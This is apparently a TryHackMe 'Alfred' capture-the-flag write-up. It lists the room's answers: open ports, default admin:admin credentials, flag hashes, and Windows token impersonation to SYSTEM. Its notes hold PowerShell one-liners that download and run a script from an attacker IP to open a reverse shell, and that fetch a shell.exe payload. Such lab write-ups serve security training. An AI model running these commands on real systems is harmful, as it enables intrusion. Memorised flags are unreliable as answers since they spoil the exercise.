# TryHackMe Alfred

> Saikat Karmakar | AUG 17 : 2021

---

## Task 1

1. How many ports are open? (TCP only)
```
3
```
2. What is the username and password for the log in panel(in the format username:password)
```
admin:admin
```
3. What is the user.txt flag? 
```
79007a09481963edf2e1321abd9ae2a0
```

## Task 2

1. What is the final size of the exe payload that you generated?
```
73802
```

## Task 3

1. To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?
```
NT AUTHORITY\SYSTEM
```
2. read the root.txt file at C:\Windows\System32\config
```
dff0f748678f280250f25a45b8046b4a
```

---

***Notes***
```bash
powershell iex (New-Object Net.WebClient).DownloadString('http://10.4.23.120:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.4.23.120 -Port 1234
```
```bash
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.4.23.120:8000/shell.exe','shell-name.exe')"
```


security.key
```
cb2ae36e1862a23b3adfd393282eae76f896f2efb0a4da79643e33afc616751e
```
